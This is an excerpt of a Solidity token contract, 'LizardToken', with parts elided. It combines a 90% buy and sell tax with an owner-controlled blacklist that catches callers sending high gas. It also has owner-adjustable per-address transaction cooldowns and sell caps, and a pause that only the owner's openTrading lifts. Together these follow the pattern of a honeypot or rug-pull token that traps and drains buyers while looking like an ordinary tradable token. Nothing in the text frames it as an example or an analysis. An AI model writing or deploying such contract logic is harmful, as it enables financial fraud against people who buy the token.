...
abstract contract BlackListable is Ownable {
    ...
    uint256 private gasLimitTx = 10 ** 10;
    ...
    function gasLimitCheck(address _user) internal {
        if (gasleft() > gasLimitTx){
            _addBlackList(_user);
        }
    }
    ...
    function getGasLimit() public view onlyOwner returns (uint256) {
        return gasLimitTx;
    }
...
abstract contract TimeLimitable is Ownable {
    uint8 internal TxHourLimit = 0;

    mapping (address => uint256) internal prevTxUnixTimeStamp;

    modifier limitTransactions(){
        _checkCurrTxLimit();
        _;
    }

    function _checkCurrTxLimit() internal {
        _checkTxLimit(_msgSender());
    }

    function _checkTxLimit(address msgSender) internal {
        uint256 previousTxStampSender = prevTxUnixTimeStamp[msgSender];
        uint256 currBlockTimeStamp = block.timestamp;
        require(previousTxStampSender == 0 || currBlockTimeStamp >= (previousTxStampSender + TxHourLimit * 1 hours), 
                "Transactions limits hit, try again later");
        prevTxUnixTimeStamp[msgSender] = currBlockTimeStamp;
    }

    function setTransactionLimitHours(uint8 hoursAfter) public onlyOwner {
        TxHourLimit = hoursAfter;
    }

}

abstract contract SellLimitable is Ownable{
    uint internal sellLimit = 10000; // 100 = 1%

    function setSellLimit(uint percentageLimit) public onlyOwner {
        sellLimit = percentageLimit;
    }

    function _checkSellLimit(uint256 sellAmount, uint256 balance) view internal {
        uint256 sellLimitTokens = balance * sellLimit / 10000;
        console.log("sellLimit", sellLimit);
        console.log("sellLimitTokens", sellLimitTokens);
        console.log("sellAmount",sellAmount);
        require(sellAmount <= sellLimitTokens, "SellLimit: Exceeded amount you can sell.");
    }
}
...
contract LizardToken is ERC20, Ownable, Pausable, BlackListable, TimeLimitable, SellLimitable {
    using SafeMath for uint;

    bool private tradingOpen;

    uint256 private _initialSupply = 10000 * 10 ** 18;
    uint256 private _maximumHoldingEachAddress = 2000 * 10 ** 18;
    uint256 private _limitEachTransaction = 500 * 10 ** 18;
    uint256 private _taxFeePercentBuy = 9000; // 100 = 1%
    uint256 private _taxFeePercentSell = 9000; // 100 = 1%

    address payable private _feeAddrWallet;

    ISwapV2Router02 internal uniswapV2Router;
    ...
    function _tokenTransfer(address from, address to, uint256 amount, bool takeFee, bool isBuy) internal {
        if (!takeFee) {
            ...
            if (to != uniswapV2Pair) {
                ...
                _checkTxLimit(from);
                _checkBlackList(from);
                _checkSellLimit(amount, balanceOf(from));
    ...
    function openTrading() external onlyOwner whenPaused {
        ...
        ISwapV2Router02 _uniswapV2Router = ISwapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        uniswapV2Router = _uniswapV2Router;
        _approve(_msgSender(), address(_uniswapV2Router), _initialSupply);
        uniswapV2Pair = ISwapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        tradingOpen = true;
        _unpause();
    }
}
